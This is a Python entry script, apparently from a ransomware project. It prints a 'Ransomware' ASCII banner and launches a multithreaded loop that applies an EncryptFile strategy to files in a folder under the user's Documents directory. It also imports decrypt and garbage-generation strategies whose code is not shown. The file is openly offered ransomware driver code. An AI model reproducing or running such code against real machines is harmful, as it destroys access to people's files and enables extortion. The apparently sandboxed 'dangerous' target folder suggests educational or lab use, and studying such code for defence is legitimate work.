from ransomware import LoopThreadHandler
from ransomware import LoopingThread
from ransomware.strategies.encrypt import EncryptFile
from ransomware.strategies.decrypt import DecryptFile
from ransomware.strategies.generate_garbage import GenerateRandomGarbage

import os

HOME_PATH = os.environ["HOMEPATH"]

def show_banner() -> None:
    print("\n")
    print("  ███████████                                                                                                       ")
    print("  ░░███░░░░░███                                                                                                     ")
    print("   ░███    ░███   ██████   ████████    █████   ██████  █████████████   █████ ███ █████  ██████   ████████   ██████  ")
    print("   ░██████████   ░░░░░███ ░░███░░███  ███░░   ███░░███░░███░░███░░███ ░░███ ░███░░███  ░░░░░███ ░░███░░███ ███░░███ ")
    print("   ░███░░░░░███   ███████  ░███ ░███ ░░█████ ░███ ░███ ░███ ░███ ░███  ░███ ░███ ░███   ███████  ░███ ░░░ ░███████  ")
    print("   ░███    ░███  ███░░███  ░███ ░███  ░░░░███░███ ░███ ░███ ░███ ░███  ░░███████████   ███░░███  ░███     ░███░░░   ")
    print("   █████   █████░░████████ ████ █████ ██████ ░░██████  █████░███ █████  ░░████░████   ░░████████ █████    ░░██████  ")
    print("  ░░░░░   ░░░░░  ░░░░░░░░ ░░░░ ░░░░░ ░░░░░░   ░░░░░░  ░░░░░ ░░░ ░░░░░    ░░░░ ░░░░     ░░░░░░░░ ░░░░░      ░░░░░░   ")
    print()

def main() -> None:
    loopHandler = LoopThreadHandler(max_threads=15)
    strategy = EncryptFile()
    initialThread = LoopingThread(loopHandler, strategy, f"C:{HOME_PATH}\Documents\dangerous")
    loopHandler.run(initialThread)

if __name__ == '__main__':
    os.system("cls")
    show_banner()
    main()